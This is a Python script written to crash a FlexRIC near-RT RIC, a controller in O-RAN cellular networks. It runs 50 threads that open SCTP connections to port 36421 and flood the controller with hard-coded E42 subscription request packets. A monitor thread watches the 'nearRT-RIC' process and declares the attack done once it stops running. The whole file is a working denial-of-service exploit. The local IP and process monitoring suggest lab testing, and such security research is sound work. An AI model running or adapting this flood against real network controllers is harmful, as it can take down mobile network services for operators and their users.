#!/usr/bin/env python3
import sys
import socket
import sctp
import time
import threading
import psutil  # Make sure to install: pip3 install psutil
import os

# Configuration
RIC_IP = "10.9.71.235"
RIC_PORT = 36421
THREAD_COUNT = 50
REQUESTS_PER_THREAD = 1000
FLOOD_DELAY = 0.001
PPID_E42_RIC_SUBSCRIPTION_REQ = 0x0064  # From FlexRIC's e2ap.h
PROCESS_NAME = "nearRT-RIC"  # Name of the FlexRIC process to monitor

E42_SUB_REQ = bytes.fromhex(
    "0015000a00000001000000010002000100030004000100050006"
    "000700080009000a000b000c000d000e000f0010001100120013"
    "001400150016001700180019001a001b001c001d001e001f0020"
)

def is_process_running(process_name):
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def flood_worker(thread_id, stop_event):
    try:
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.setblocking(False)
        sock.connect_ex((RIC_IP, RIC_PORT))
        for i in range(REQUESTS_PER_THREAD):
            if stop_event.is_set():
                break
            try:
                sock.sctp_send(
                    E42_SUB_REQ,
                    ppid=PPID_E42_RIC_SUBSCRIPTION_REQ,
                    flags=0
                )
                if i % 100 == 0:
                    print(f"[Thread {thread_id}] Sent {i}")
                time.sleep(FLOOD_DELAY)
            except (BlockingIOError, OSError):
                time.sleep(0.01)
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {str(e)}")
                break
    except Exception as e:
        print(f"[Thread {thread_id}] Failed: {str(e)}")
    finally:
        try:
            sock.close()
        except:
            pass

def monitor_ric(stop_event):
    print(f"[Monitor] Watching for process '{PROCESS_NAME}'...")
    while not stop_event.is_set():
        if not is_process_running(PROCESS_NAME):
            print("\n[Monitor] FlexRIC is down! Attack done.")
            stop_event.set()
            break
        time.sleep(1)

def main():
    print(f"Attacking {RIC_IP}:{RIC_PORT}")
    stop_event = threading.Event()
    threads = []

    # Start the monitor thread
    monitor_thread = threading.Thread(target=monitor_ric, args=(stop_event,))
    monitor_thread.daemon = True
    monitor_thread.start()

    # Start the attack threads
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=flood_worker, args=(i, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        stop_event.set()

    print("Exiting.")

if __name__ == "__main__":
    main()
